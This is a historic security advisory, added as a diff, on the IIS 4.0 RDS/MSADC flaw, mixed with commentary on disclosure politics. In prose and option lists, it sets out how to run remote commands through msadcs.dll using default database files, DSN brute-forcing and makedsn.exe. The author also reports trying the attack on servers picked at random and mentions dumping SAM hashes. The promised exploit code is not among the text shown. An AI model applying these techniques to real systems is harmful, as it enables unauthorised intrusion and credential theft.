@@ -1,0 +1,1246 @@
+
+  #### ALERT! #### RDS/IIS 4.0 Vulnerability and exploit #### ALERT! ####
+
+		By rain forest puppy / ADM / Wiretrip
+
+
+	"it...is direct, immediate, and almost 100% guaranteed
+	 to work....THE NUMBER OF HUGE SITES THAT ARE VULNERABLE
+	 IS RIDICULOUS!"
+					-Russ Cooper, NTBugtraq
+
+
+	"This exploit also does *not* require the presence of
+	 any sample web applications or example code...the 
+	 issue affects at least 50% of the IIS servers I have
+	 seen"
+					-Greg Gonzalez, NTBugtraq
+
+
+	"Groovy, baby."
+					-Austin Powers, Spy who Shagged Me
+
+
+- - - Table of Contents:
+
+  1.  Names, PRs and the Media: State of Security Advisories
+  2.  RDS Vulnerability Background
+  3.  *MY* Guess at Greg's RDS Vulnerability
+  4.  Bonus Aspects of My Version of the Exploit
+  5.  Command Line Options
+  6.  Random Q & A
+  7.  Signoff
+  8.  The code!!!!
+
+- 1 - Names, PRs and the Media: State of Security Advisories
+
+   When I was at DefCon, I had an interview with a reporter who was doing
+a story on 'hacker handles'.  Of course, with a handle like Rain Forest
+Puppy, I was a sure-win.  After a 20 minute chat, the last question he
+asked me was "What is your real name?"  Of course, my response was "does
+that matter?"  Well, to him it did.  It seems like it matters to all the
+big, formal media types and vendors.  A perfect example of this would be
+the whole RDS saga.  Greg Gonzalez's original post gave me credit, since
+he used some of what I talked about in my ODBC advisory posted to Bugtraq
+earlier (thanks, Greg!).  Russ Cooper did a recap, but failed to mention
+me.  Microsoft's advisory acknowledged Russ and Greg as well, sans me.
+
+   Now, I'm not an egomaniac that needs to see my name splashed over
+everything.  For that matter, those of you who know me personally know how
+laid back I am concerning most issues.  The point I'm trying to make is
+whether or not a name is 'unsuitable' for mention in something as flashy
+as a Russ or MS post (although side note, I must admit, Wired and ZDNet
+have lightened up to this fact, especially lately with all the Dildog and
+Orifice talk going on).  If I remember correctly, David Litchfield got
+some mentions for various vulnerability findings he had.  But everyone
+referenced him as David Litchfield, not 'Mnemonix', which is his hacker
+handle (BTW, greetings to Mnemonix.  Thanks for serving as an example. :)
+Even lately, for those of you Bugtraq fans out there (hey, how the hell
+are you reading this, anyway!?!?!), you'll have noticed gone are the
+loveable bytes of 'Aleph1' in place of Elias Levy.  Now, in Aleph1's
+defense, I can see justification of the shift.  But the general fact that
+there is a need/trend for a shift is concerning me.
+
+   The only taboo I can think of for the 'evil' of a hacker handle is the
+issue of the obvious: anonymity.  Apparently I must be running around
+doing 'very bad things' (funny movie, BTW), and so I need to hide who I
+really am, right?  
+
+   Uh, no.  (For lack of a snappy comeback)
+
+   I don't want to make this diatribe overly long, since I know you're
+only here for the exploits anyway :)  But seriously, why use a handle?
+Well, there is a sense of tradition, for one.  I shall not explain,
+because I think it's apparent.  The other is a sense of community.  If
+you're going to engage in a security discussion, why not do it with other
+security professionals.  And where can you just so happen to find a large
+gaggle of people who know about security?  Your local IRC server, sitting
+in #hackphreak (watch out, JP logs), #hackteach, etc.  These people have
+nicknames themselves.  So get yourself a nick and join in the
+conversation!
+
+   But really, I use an alias.  Does that make me evil?  If I told you
+my real name, would that shift your perspective of me into the light of
+good?  We'll get back to this, I want to transgress to another issue.
+
+   I use a handle.  My only collateral at this point is my name, and my
+name alone.  If I find a big hole, post a research paper, etc, it adds
+nothing but perhaps an "atta'boy" to the accomplishments of my nickname.
+I've talked to people in real life and held discussions about that 'Rain
+Forest Puppy' guy, they not knowing I was Rain Forest Puppy. The
+accomplishments belong to that name, and that name alone...unless I start
+equating that name with other things.  So, let's pretend I did.  Let's say
+I tossed my real name out there, and got that associated with my handle.
+Now people in real life will equate the findings of Rain Forest Puppy to
+me. I can add in my company name.  Now my company can ride the 'success'
+(if you will) of my findings as well, just because they're associated with
+my name.  (Come on, you know these situations exist.  Transmeta is cool
+just because the name 'Linus' is involved.) If I equate all kinds of
+aspects together, I can then distribute the attention (a.k.a. advertising)
+to them all as well.  Think about it....if I found the next remote root
+compromise in, say, sshd, I could slap not only my handle and name but
+also my company name (Amazonian Trees, Inc) all over it!  Wow, would that
+not be great marketing for Amazonian Trees, Inc, especially if it ATI's
+primary service was security related!
+
+   But hey, it's America.  We live to make money, so it seems.  So why not
+do this?  Right?  Well, 'tis also the trend.
+
+   Look at all the press releases on security issues.  The most recent one
+was by Greg Gonzalez himself, for his company Information Technologies
+Enterprises, Inc.  The press release is at
+
+	http://www.infotechent.net/itenews.htm
+
+Now, what I find interesting is that Greg has made a post to NTBugtraq
+about the RDS vulnerability, yet will not release details of the
+vulnerability until next week.  Hmmm.  Ok, so he can't release details,
+but he can release press releases about it.  Your point was made with the
+post to NTBugtraq...the point of the press release is to ride the fame to
+gain corporate exposure (which I'm equating as an excessive, corporate,
+political machine type move which isn't all that wonderful).  Not to pick
+on Greg, because it's the trend.  Look at WebTrends.  They issued a press
+release on 'their finding of security vulnerabilities in IIS sample
+scripts' (never mind the fact that I had talked about such in a previous
+Phrack article last December).  The press release is at
+
+	http://www.webtrends.com/news/releases/release.asp?id=81
+
+Wow, a vendor of a security scanner using the finding of vulnerabilities
+as free marketing for their products.  Well, do it where you can, right?
+
+   I will move off this subject, because L0pht has a nice long
+composition on the matter in the Soapbox on their website, at
+
+	http://www.l0pht.com/~oblivion/soapbox/index.html
+
+One interesting statement L0pht makes, going back to Greg Gonzalez and
+Russ Cooper keeping the details of the RDS vulnerability to themselves for
+a week:
+
+	"Now we have software vendors keeping things secret. At 
+	 least secret for a substantial period of time. Is this 
+	 the way we want the industry to behave?"
+
+Wow, right on, brothers Mudge, Dildog, Weld Pond et al.  Greetings, BTW.
+
+---- Credits and Thank Yous ----------------------------------------------
+
+I'd like to take this brief moment to say thank you to L0pht (www.l0pht.com)
+for helping me test my perl script and taking time to review my advisory.  
+I'd also like to thank Vacuum of www.technotronic.com and Mike Dinowitz 
+of www.houseoffusion.com for their input and testing as well.
+
+--------------------------------------------------------------------------
+
+   So back to the 'only a handle' thing. You have to understand that I 
+have a different perspective on it all.  I publish everything under an 
+anonymous handle. What do I gain from this?  Nothing personally.  Nadda.  
+Zip.  The handle itself may gain some fame, but not me personally.  I do 
+not profit from this one way or another.  What I do I do because I want 
+to, on my free time--and do it in a manner that is not greedy in any aspect.
+I don't seek to gain, and in the current setup, I really can't gain a
+whole hell of a lot.  But I'm the bad guy, I forgot.  It's much more
+normal to leverage a security vulnerability as a marketing tool than it is
+to just 'give' time and research away.  Wow, I need to get with the Y2K I
+guess.
+
+   Fine then. (Last tangent, then we'll get to the RDS issue, I promise :)
+So, going back to you seeing me in the light of good....  Could you better
+relate if you had a 'normal' name?  Are you embarrassed to say/use 'Rain
+Forest Puppy' in conversation/publication? (Well, I mean this generically
+for all hacker handles, but I'm specifically talking about mine here)
+Would I be seen as more a security resource/less of a evil hacker if you
+had a name to associate with my handle?  Well, I guess I should make that
+step.  From now on, you can associate Mr. Russell F. Prigogine with the
+nick Rain Forest Puppy (Hmmm...no, the initials are not mere
+coincidence...clever, eh?).  But since the big 'Russ' on campus is Russ
+Cooper, NTBugtraq moderator extraordinaire (who believes sample apps are
+not a security concern worth talking about.  Real slick, Russ), I would
+prefer to have be used Mr. R.F. Prigogine (Mr. optional), if you can't--or
+don't want to--use the nick Rain Forest Puppy.
+
+   So there.  (As some would say) I sold out (oh, the horror of it).  JP,
+add that to your profile database.  While I gather the broken pieces of my
+dignity we'll move along to what you really want...
+
+- 2 -  RDS Vulnerability Background
+
+   Last Friday Greg Gonzalez (re)posted his findings of vulnerabilities
+in regards to the RDS problems originally detailed in MS98-004, which came
+out around July 16, '98.  He took that issue (which is basically the
+simple fact that 'Remote Data Service' components allow *remote* access to
+your *data*....who would have thought?) and combined it with the Jet
+pipe/VBA delimiter 'feature' I discussed in my recent advisory.  The
+result?
+
+	1.  You can make remote queries via RDS
+	2.  You can embed NT command line commands in queries
+
+Well, that's a pretty good combo. (side note, not to brag or anything, but
+I mention the fact that RDS can be used to do that in my ODBC advisory,
+under the title 'Msadc').  But, Greg threw in a twist which supposedly
+is the kicker:
+
+	3.  You don't need user IDs (and therefore no password required),
+	    does *not* require the presence of any sample Web applications 
+	    or example code, or even an active database
+
+I suppose that's a pretty big kick.  Wow, no UIDs/passwords, NO SAMPLE
+SCRIPTS!  Well, I guess that means Russ Cooper will let the post through
+then... (if you don't get it, go back and re-read section one).
+
+So Greg can do all that.  And, to reiterate how dangerous this problem
+really is...
+
+
+        "it...is direct, immediate, and almost 100% guaranteed
+         to work....THE NUMBER OF HUGE SITES THAT ARE VULNERABLE
+         IS RIDICULOUS!"
+                                        -Russ Cooper, NTBugtraq
+
+
+        "This exploit also does *not* require the presence of
+         any sample web applications or example code...the
+         issue affects at least 50% of the IIS servers I have
+         seen"
+                                        -Greg Gonzalez, NTBugtraq
+
+
+
+   *** MEDIA FOLKS ***	As it seems it's fun to attach dollar loss amounts
+			advisories, I will say the potential amount of
+			damage, due to the fact that at least 50% of all
+			IIS servers Greg has seen (hopefully he's seen a 
+			lot) are vulnerable, using my sophisticated
+			reliable statistical computation method that is 
+			authoritative, I'd place damage loss somewhere in
+			the 'close to Bill Gates salary(tm)' range.
+
+
+
+   Now, the sad part.  As I mentioned before, both Greg and Russ (from this
+point on, all instances of 'Russ' refer to Russ Cooper, and not the name
+R. F. Prigogine) both know the details of this vulnerability.  And yet
+they are keeping them amongst themselves until next week.  Does this even
+disturb anyone?  Greg says at least 50% of the IIS servers are
+vulnerable...
+
+DO WE WANT RUSS COOPER WITH THE KEYS TO 50% OF IIS SERVER ON THE INTERNET?
+
+Ok, I have a scenario that's the same in principle, but will disturb
+people even more:  
+
+---- Begin same scenario ------------------------------------------------
+
+Rain Forest Puppy (or R. F. Prigogine, if it makes you feel better/is more
+visually pleasing) has found a hole in the latest build of Apache web
+server.  There's a hole.  I will announce there's a hole.  I'll write up a
+few PRs as well.  But I will not tell you the exact nature of it.  Don't
+worry, Apache group will code a fix, and you'll be all set in a jiffy.  In
+the meantime, I'm not going to release the details of the exploit of the
+hole. Instead I'm going to just keep it to myself....and my good buddies 
+Vacuum, Antilove, Stranger, and the rest of the Wiretrip and ADM crews.
+
+-------------------------------------------------------------------------
+
+Hmmm....I bet *that* disturbed you.  How about a better translation:
+
+---- Begin translated same scenario -------------------------------------
+
+I, RFP, have found a hole in Apache that I will not tell you about until
+later, but in the meantime, me and my hacker buddies will know about it!
+Nnnnnnaaaaaaayyyyyyaaaaahhhhhh!  So sit back and feel helpless.
+
+-------------------------------------------------------------------------
+
+What's the difference?  Only the integrity of the people involved.  Again,
+a name thing perhaps.  Russ Cooper, Greg Gonzalez, they're Ok.  Rain
+Forest Puppy, Antilove, nope, that's scary.  You don't even know if Greg
+Gonzalez isn't really a hacker that goes by 'Digital Killer'.  I push for
+the point that no matter who it is in any case, it's wrong.
+
+   Elias Levy would have told everyone the bug. :)
+
+   NTBugtraq = moderated disclosure.  Hmmm.  I still like Russ's "Would
+you pay?" Administrivia from Feb 99, in which he says:
+
+	"Someone else makes the Security Portal and you get what they
+	 think you need"
+
+As oppose to getting what Russ thinks we need instead?  It all depends on
+whether or not the other guy denies posts about sample scripts....(if you
+*still* don't get it, re-read section one AGAIN).
+
+   Ok, ok, so that RDS background turned more into a political thing.
+Well, that's because it is.  At this point, Russ and Greg are have the
+keys to IIS servers.  I don't know about you, but I'm not liking it.  So
+I'm getting off my ass and doing something.  Besides the fact that this is
+all published stuff at this point.
+
+   Also, I may be considered 'irresponsible' for posting the exploit.
+Now, I would say *maybe* it would be debatable if I had posted *only* the
+exploit.  But I have posted not only a very long diatribe, but also my
+guess of the vulnerability, which includes examples of analysis and
+theory.  My hopes are to educate people on what the problem is, and how I
+went about finding it so that they can perhaps learn how to do it
+themselves.  Education.  It's the key, and that's what I'm trying to do.
+No, no vendor education...ADMIN education. USER education.  I know I will
+probably be futile as a whole in the end, but maybe a few people will
+learn something, and that's all that matters to me.
+
+- 3 -  *MY* Guess at Greg's RDS Vulnerability
+
+   (I say 'guess' because I may not be right.  But in any event, I
+wouldn't be writing all this unless I found something moderately
+interesting ;)
+
+   Ok, so Greg's RDS vulnerability has three main aspects:
+
+	1.  You only need RDSServer.DataFactory component
+	2.  It uses Jet queries with my embedded VBA via pipes trick
+	3.  You don't need userIDs (and therefore no password required),
+	    does *not* require the presence of any sample Web applications 
+	    or example code, or even an active database
+
+   Now, for those of you who don't know, RDS is basically a way to do
+remote data queries to a server.  This is done over the web.  Basically
+your client app communicates via HTTP to the /msadc/msadcs.dll on your
+server. The msadcs.dll exposes the RDSServer.DataFactory object, or better
+known as the AdvancedDataFactory.
+
+   Now AdvancedDataFactory only has four methods, so we're kind of limited
+on what we can do.  We can CreateRecordSet, Query, SubmitChanges, and
+ConvertToString.  Query and SubmitChanges require a valid database to work
+upon.  The other two are just data mangling functions.  So there you have
+it, that's what we have to work with.
+
+   I played with CreateRecordSet and ConvertToString.  This actually
+relays data from the client, to the server, and back.  My hopes was that
+somewhere in there I could slip one of my pipe-VBA-shells in there and do
+fun stuff.  But nope, all they did was regurgitate the data in a different
+flavor.  Oh well.
+
+   SubmitChanges just basically does an elaborate UPDATE/INSERT, where it
+just syncs the server's database with the client's recordset.  So that
+leaves Query.
+
+   Well Query lets us run queries against an (existing) database.  And we
+know we can embed our pipe-VBA-shells in queries, so Query looks good.
+But this is nothing spectacular.  And there is one catch: the need for an
+existing database.  We need to pass a DSN to the ActiveDataFactory to
+actually run the query on.  The problem with the DSN is that:
+
+	1.  DSNs can require UIDs and passwords
+	2.  There's no way to get a list of available DSNs
+		(** through RDSServer.DataFactory functions, that
+			I'm aware of **)
+	3.  I'd say a DSN constitutes an 'active' database
+
+   So DSNs blow away point 3 of our known things about Greg's RDS
+vulnerability.  What if we can get around using DSNs?
+
+   Well, we can.  See, you can go the easy route by specifying "DSN=rfp",
+and then the server keeps all the internal information about that DSN,
+including driver, actually database file location (if it's a file-based
+driver), UID, password, connection parameters, etc.  Well, what's fun is
+that we can directly give all that stuff in the query setup instead of a
+DSN.  Let's say we setup a DSN named 'rfp' (for Rain Forest Puppy or R. F.
+Prigogine).  We will use these parameters:
+
+	DSN name 'rfp'
+	Microsoft Access (Jet) driver
+	c:\rfp.mdb for our database
+	UID will be 'rfp'
+	password will be 'prigogine'
+
+So by invoking "DSN=rfp", the server knows to use the Access driver on the
+c:\rfp.mdb file.  DSNs are a nice tight way to precompose all that
+information.  Or we can do it on the fly.  Rather than issuing a "DSN=rfp"
+connect string, I can use instead:
+
+	"driver={Microsoft Access Driver (*.mdb)}; dbq=c:\rfp.mdb;"
+
+This will still invoke the Access (Jet) driver, and tell it to directly
+use c:\rfp.mdb.  No UID.  No password.  No even worrying about if/what
+DSNs exist.  In the words of Cartman, "Sweet".
+
+   That whacks out part of known point #3 (no UID or password).  We're
+going to use the RDSServer.DataFactory control (known point #1), and we're
+going to use the Access driver, with fun pipe-VBA-shell features (known
+point #2).  We're not using any other web sample scripts, so that cuts out
+another portion of known point #3.  Oh, we're so close...can you taste it?
+(and what does it taste like?  chicken?)
+
+   There's still one minor detail.  Notice we have to specify the 'dbq='
+parameter in the connection setup.  And this needs to be a valid file.  If
+it's not, the SQL engine on the server side will fail and return errors
+before it even gets around to looking at our queries.  But damn, we need
+an .mdb file to connect to.  Well, if you look in the Access ODBC
+reference on Microsoft's website (which sucks, half the links were broken at
+various moments through the night while sifting through it...go MS.  I
+don't blame you though--you probably engineered your site/servers with
+Microsoft products, and that explains it right there) you will see that
+you can pass a CREATE_DB parameter to the Access driver.  This will cause
+the driver to construct a valid (empty) .mdb file.  Woohoo! (not to 
+be confused with w00w00; the former is an expression of joy, the latter is
+a cool group of guys that I had the fortune of hanging out with at DefCon)
+So in our connection setup we pass a "CREATE_DB=c:\rfp.mdb" attribute with
+everything else and low and behold, it......   <to be continued...>
+
+----- Some words about my sponsors ---------------------------------------
+
+-- www.technotronic.com		Technotronic!  Great place!
+
+Run by fellow Wiretrip'er Vacuum, who is also a co-founder of Rhino9
+(before Rhino9 'disbanded'; Neon, Horizon, Xaph: come back to the US!),
+boasting a slick HTML design recently redone by yours truly (Rain Forest
+Puppy/R. F. Prigogine), it's definitely a good site for the latest
+security information--especially while PacketStorm is struggling to get
+back on its feet (thanks, JP.  Now die.  What, you're sueing me now?!?)
+
+While you're there, be sure to check out:
+
+* Winfingerprint! -- coded by Vacuum, this tool lets you remotely query a
+			windows box and see if it's a PDC, BDC, Member
+			server, SQL server, etc.  Also look for the Unix
+			port of it by me sometime soon (after I finish
+			all this RDS stuff)
+* Horizon's Page! -- that's right.  Elite HTML coded by Humble himself.
+			Problem was he didn't know where to put the shell
+			code...<a href>?  J/K :)  The URL is /horizon/
+* Newest R9 Tools! -- coming soon.  Before 3/4ths of Rhino9 moved to
+			Germany, there was one last code fest, and some
+			fun binaries came out of it.  Look for them soon!
+			Technotronic also has the R9 mirror at
+			rhino9.technotronic.com
+
+
+
+-- www.l0pht.com		L - zero - p - h - t
+
+Everybody knows L0pht (even senators!)  A very active 'independant
+security (watchdog) group' who include Dr. Mudge & Dildog (BO2K creator).
+
+While you're there, be sure to check out:
+
+* L0phtcrack!   -- one of the best NT password crackers out there! This
+			will prove highly useful if you use this exploit
+			do dump the SAM and grab the backup (not that
+			I encourage hacking...I've done this many times
+			in LEGIT contracted audits).  It's a personal
+			tool I've standarized on.
+* Advisories!  -- L0pht releases a very nice variety of advisories, from
+			Windows DLL problems and Cold Fusion script
+			problems to Unix race conditions and symlink
+			vulnerabilities.
+* NFR Modules!  -- they've teamed up with NFR to be the supplier of many
+			interesting N-code/NFR modules.  They have a nice
+			selection for your popular network attacks.
+
+** plus I must note that the Palm Pilot stuff, Soapbox, and BBS are pretty
+	awesome as well!
+
+
+-- www.houseoffusion.com     A great independant Cold Fusion site!
+
+The site of a great friend of mine, Mike Dinowitz, who is my 'go to' man
+for all things Cold Fusion and has helped me out immensely with various
+Cold Fusion language issues (read: helped me work through some of the
+various Cold Fusion exploits that have surfaced).  He does offer training
+for Cold Fusion...see 'Training Info' under '<Community>'.  He co-authored
+"Advanced Cold Fusion 4.0 Application Development" and "Cold Fusion Web
+Application Construction Kit" vols 2 and 3, and was the founding member of
+Team Allaire. Plus, he's an all-around good guy(tm).  Also an editor of CF
+Advisor, at www.cfadvisor.com.
+
+While you're there, be sure to check out:
+
+* MunchkinLAN! -- a CF based web scanner, which is actually very minimal
+			code and runs out of an Access db.
+* Mike's Mods! -- many modifications to the Cold Fusion Forums scripts,
+			which include speed/operation improvements.
+* CF-Talk!  -- Mike is the moderator/owner of the CF-Talk list, which is
+			a high traffic list discussing Cold Fusion related
+			development issues, security, etc.
+
+
+-- Thanks again to all of the above!
+
+-------------------------------------------------------------------------
+
+<continued from above>   ...didn't work.  Damn.  The problem was that it
+was passing the CREATE_DB parameter during the SQLDriverConnect() phase,
+and that just isn't going to cut it.  We need to issue a
+SQLConfigDataSource() call (I think that was it...my mind is a mush of
+ODBC/SQL/RDS/ADO/OLEDB/FMP API right now) to get CREATE_DB to do it's
+thing, and RDSServer.DataFactory.Query just wasn't going to give us love.
+So, after struggling with other nuances and ideas, I concluded that I
+couldn't make a DSN, or a .mdb from scratch using Access SQL via
+RDSServer.DataFactory without connecting to a database/.mdb beforehand.
+
+(**NOTE: if you know how this can be done, EMAIL ME!  I WILL TRADE YOU
+	0DAY! :)  rfp@wiretrip.net )
+
+   Well damn, so we need a database to make this work.  Any 'ol database
+will do (hell, even the WINS or DHCP .mdb should work >:).  But
+unfortunately, none come by default on a standard NT install.  Bummer.
+But wait....all is not lost....
+
+   It seems when you do a 'typical' or better install with Option Pack 4,
+a particular .mdb is installed...namely the btcustmr.mdb which is
+installed to %systemroot%\help\iis\htm\tutorial\.  Microsoft saves the
+day!  They're just so damn efficient at helping us hack their own
+product...
+
+   To get IIS 4.0 you practically need to install Option Pack 4, which
+will also then install MDAC 1.5--this is good.  Let's just hope they
+didn't pick the 'minimal' install...  The last catch is that we need to
+figure out what %systemroot%.  On the majority of the systems it will
+probably be c:\winnt, d:\winnt, e:\winnt, or f:\winnt (don't laugh, mine
+is f:).  I guess some wacko might do \win, \windows, \nt, and if you
+upgrade it may be \winnt351 or \winnt35.  Well, we can do a little 'brute
+force' on all those combinations until one works.  Oh, and no, you can't
+do "dbq=%systemroot%\help\iis\htm\tutorial\btcustmr.mdb"...the SQL driver
+pukes.
+
+   So that's my guess!  Mr. Gonzalez is using a connection string similar to
+
+	"driver={Microsoft Access Driver (*.mdb)};
+		dbq=c:\winnt\help\iis\htm\tutorial\btcustmr.mdb;"
+
+with a query that contains one of the pipe-VBA-shell commands.  Now, I
+think this technically meets all the known points of the exploit--the only
+fuzzy one is where Greg mentions "no need of an *active* database".  Now,
+I may be reading into it, but btcustmr.mdb is hardly active.  It's a
+totally unused .mdb sitting in a directory most people probably didn't
+know existed.
+
+   Just to double check, I did a quick little test...and six of the ten
+servers I picked off the Internet were susceptible to this method.  That'd
+a tad better than Greg's 50%, but I had a small population sample, so I'll
+give him the benefit of the doubt.
+
+   Now, I obviously could be wrong.  Maybe Greg found a way to create the
+.mdb, or some other way where he doesn't need to rely on the existence of
+btcustmr.mdb.  I'm not claiming to be a SQL/database wiz--actually, I hate
+database applications.  Period.  They're gross.  But I put up with it for
+the better good of the Internet. :)  But yes, I could be wrong, and I'm
+willing to admit it.
+
+   Let me also mention the contenders.  They were contenders, but
+definitely did not make the final round because as much as the 'look' and
+'smelled' exploitable, I couldn't get them to crack:
+
+   1. Data Shape Provider.  This already has hooks into the VBA
+interpreter ( you can put VBA commands in the CALC() function--except it
+lacks shell()), and is a primary suspect in my eyes.  The bonus is that
+you do *not* need any database files to use this.  Well, barring the fact
+that I really don't know what I'm doing, I played around with it trying to
+feed some pipe-VBA-shells to it and whatnot, but couldn't get anything
+interesting to happen.  Now, this is installed by default, has VBA hooks
+already, doesn't need a database, etc.  I say this fits the description
+more that the btcustmr.mdb thing.  And it's just all together 'cooler'.
+
+   2.  Index Server Provider.  Now, not all places use Index Server, so I
+highly doubted this was the route, but it is a contender.  Again, you
+don't need a database file, so that's a bonus.  I tried the usual
+pipe-VBA-shell commands, but no go either.
+
+   If I really had to choose, I'd say the exploit was in the Data Shape
+Provider (which Microsoft also warned of in the advisory).  But since I
+couldn't get it to give me love, I went with btcustmr.mdb.
+
+- 4 -  Bonus Aspects of My Version of the Exploit
+
+   So, yes, I could be wrong.  But I figure why not just feature pack this
+exploit to *really* kick some ass?  Well, so, I wasted a few brains cells
+(the things I do for you people...jeez) and thought of some good things to
+toss into the code.  I figure hey, might as well make this a useful tool!
+
+   The first one is pretty obvious.  There are many applications on the
+market, that would be used on a server, that would make/require a DSN.
+For instance Cold Fusion creates a few DSNs, as does iHTML.  Some of the
+sample apps that come with IIS create DSNs as well, and the MDAC makes a
+few too.  All these potential DSNs.  Remember, it only takes one DSN to
+work.  So if we wanted to, we could scan to see if any of a number of
+default DSNs exist, and if they do, exploit them.
+
+   An extension of this would be user created DSNs.  Again, all we need is
+the DSN name, so we can scan for what are 'psychologically' common DSN
+names.  For instance test, web, data, database, www, db, and sql are
+common type DSN names.  Basically, if you supply a dictionary file of DSN
+names you want to use, the exploit will sit there and brute force, a la a
+remote password cracker on the DSN names.
+
+   Of course, we'd need DSNs with the Access Driver.  But what's nice
+is that if we connect to a valid DSN with an invalid SQL query, we'll get
+back the name of the driver in the error message.  So it's a nice way to
+check.
+
+   Then we can also do an inverse type thing--instead of looking for
+common DSNs to connect to, we can look for common .mdbs to connect to.
+For instance MS Cert Server, DHCP, and WINS all use .mdbs, as well as
+particular sample scripts, SDKs, etc.  We can just try to connect to them
+directly.  If we find one, rather than dealing with the table information
+within the .mdb, we can just CREATE TABLE on it first, and then exploit
+the table we just created.  Very simple. 
+
+   Another interesting feature is dumping the root scope paths from Index
+Server.  Basically it's a query of "Select paths from scope()".  This is
+useful because it can provide us with useful directory information...since
+one of the tricky problems is determining location of html files and
+systemroot (although they're most likely guessable, that's not always the
+case).  So I tossed this in for kicks, although it doesn't run 'inline'
+with the actually exploit checks.  You invoke this functionality
+separately.
+
+   The last extra functionality, but the easiest of them all, is to see if
+/scripts/tools/makedsn.exe exists on the webserver.  If it does, we can
+make a DSN and define the .mdb file to use, and then exploit it right
+away.  In my particular exploit I make a DSN named 'wicca'.  (Greetings to
+Simple Nomad!  I wish you could have been around at DefCon.  Next time.)
+
+   So, wow.  Lots of ways to get a database connection.  My RDS exploit
+tries them in the following order, continuing until successful:
+
+- try raw driver connect to btcustmr.mdb
+- try to create a DSN with /scripts/tools/makedsn.exe
+- look for common DSNs
+- look for common .mdbs
+- try 'dictionary' attack on user DSNs
+
+   And separately you can query Index Server to get the paths information
+(Warning: this could be a lot of information!  The script automatically
+sorts out common directories).
+
+----- Campaign solicitation --------------------------------------------
+
+		XOR!! The unofficial AES candidate!
+
+There are many reasons why you should support XOR:
+1.  It's mad fast!
+2.  It can be implemented in very little code
+3.  It will run with decent performance even on the meekest of 
+	Casio watches
+4.  The ciphertext doesn't look like the plaintext--this is good.
+5.  Stream, block, chained, unchained, XOR does it all!
+6.  So many companies already use it as their encryption algo of choice!
+
+	So join the 'AES XOR y2k == 8w8' campaign today!
+
+------------------------------------------------------------------------
+
+   One interesting feature that's almost necessary is a 'resume' mode.
+Imagine you just scanned a webserver, spending the last 5 minutes trying
+all the combinations of valid default .mdbs, valid DSNs, etc.  Finally it
+cracks and you get one, and you run your command.  Well, what if you want
+to run another command?  Do you have to go through that rigmarole again?
+Well, not with my script. :)  When you make a successful connection, it
+writes out a file called 'rds.save'.  Then, you can just use the 'resume'
+switch (-R), with no other options.  It will read in rds.save, and let you
+run a command against the successful connection again right away.
+
+   Sound good so far?  Ok, I'll briefly go through the command line 
+options.
+
+- 5 - Command Line Options
+
+   To run the program, just save this whole advisory to a file, such as 
+msadc.pl.  Then run "perl -x msadc.pl".  Perl is smart and will figure out
+how to run the exploit at the end.  No need to cut and paste. :)
+
+   Ok, the command switches are as follows:
+
+	-h <ip or domain>	this is the host to scan.  You MUST either
+				use either -h or -R.
+
+	-d <value 0-?>		this is the delay between connections.
+				Value is in number of seconds.  I added
+				this because hammering the RDS components
+				caused the server to occasionally stop
+				responding :)  Defaults to 1.  Use -d 0
+				to disable.
+
+	-v			verbose.  This will print the ODBC error
+				information.  Really only for
+				troubleshooting purposes.
+
+	-e			external dictionary file to use on step
+				5--the 'DSN dictionary guess' stage.  The
+				file should just be plaintext, one DSN
+				name per line file with all the DSN names
+				you want to try.  Quite honestly a normal
+				dictionary file won't do you much good.
+				You can probably do pretty damn well with
+				a few dozen or two good ones, like 'www',
+				'data', 'database', 'sql', etc.
+
+	-R			resume.  You can still specify -v or -d
+				with -R.  This will cause the script to
+				read in rds.save and execute the command
+				on the last valid connection.
+
+	-X			perform an Index Server table dump instead.
+				None of the other switches really apply
+				here, other than -v (although -d still
+				works, there's no need to slow down one
+				query).  This dumps the root paths from
+				Index Server, which can be rather lengthy.
+				I suggest you pipe the output into a file.
+				Also, if there is a lot of return
+				information, this command may take a while
+				to complete.  Be patient.  And I don't
+				suggest you use this command more than
+				once a minute...it caused my P200 w/
+				128 RAM to stop answering requests, and
+				in general borked inetinfo.exe.  If you do
+				decide to CONTROL-C during the middle of the
+				data download the script will save all 
+				received data into a file called 'raw.out',
+				so you don't loose everything you've 
+				already received.  NOTE: this is the raw 
+				data, which is in Unicode. 
+
+- 6 -  Random Q & A
+
+- "This or that function of the script is broken"
+-- Well, it wasn't broken when I used it, so you must of broke it.
+	No, seriously.  I've tested it on Linux, L0pht tested it on
+	Solaris, and Vacuum tested it on NT (using Perl 5.005-03 for 
+	Windows).  They worked for us.  I've coded some various checks
+	for errors, but nothing robust.  But I know it worked for me. :)
+
+- "Why don't you code this in C?"
+--  Because I've been programming C/C++ for 8 years.  I'm tired of it. 
+	I've been coding perl for 3, so it's new and fresh, and I'm just
+	now starting to do interesting stuff.  Plus the code is portable
+	this way.  Come on, where else can you have a piece of code that
+	does network/socket level stuff that runs on NT, Linux, and Solaris 
+	with no changes??!?
+
+- "Or you going to port this to C?"
+--  It wouldn't be that hard at all, but wasn't planning on it.  You have
+	something against perl?
+
+- "What's the F in Russell F. Prigogine stand for?"
+--  Fabio. Fear the geese.
+
+- "Why do you act like this is a joke?"
+--  Because I don't get paid for doing this, I don't get donations, and I
+	don't get any sexual gratification from this what-so-ever.  I
+	do this because I *like* to, because it's *FUN*--so damn it,
+	I'm having fun!
+
+- "I don't get some of the jokes in the paper.  Like what's FMP?"
+--  If you have to ask, you wouldn't understand.  This advisory is
+	teeming with inside jokes.  RFP, FMP.
+
+- 7 -  Signoff
+
+   Ok, I've been coding the exploit, reading MS database propaganda (did I
+mention yet I hate database stuff?), and writing this damn advisory for a 
+collective of 30 hours. About time I stop and never think about it again.
+:)
+
+   So you have my best shot at the RDS exploit, even though I think there may
+be something pretty nifty hiding in the Data Shape Provider (or maybe
+Index Server).  We'll just have to wait and see if/when Greg and Russ
+finally decide they can share their toys.
+
+   Remember, I spent 2 days typing all this in an attempt to teach people
+something, rather than to just release the vanilla exploit.  So if you
+want to label me irresponsible, well, I suppose I could have been more so.
+Moreover, I support eEye in what they did 100%.  Russ says "there are
+numerous unwritten rules when it comes to security disclosures".  Rules?
+Unwritten?  Well, maybe eEye was unaware of these rules, since they're not
+written down. 
+
+   Future updates to this advisory and exploit code will be posted to
+
+	www.technotronic.com/rfp/  
+
+   Well, it's been fun.  Until the next release (which may be sooner than
+you think ;)
+
+		- rain forest puppy / R. F. Prigogine -
+
+		    -      ADM     /   Wiretrip   -
+
+			  - rfp@wiretrip.net -
+
+
+
+	*** SPECIAL THANKS once again to Mudge and Weld from 
+	www.l0pht.com for helping me out on the preliminary 
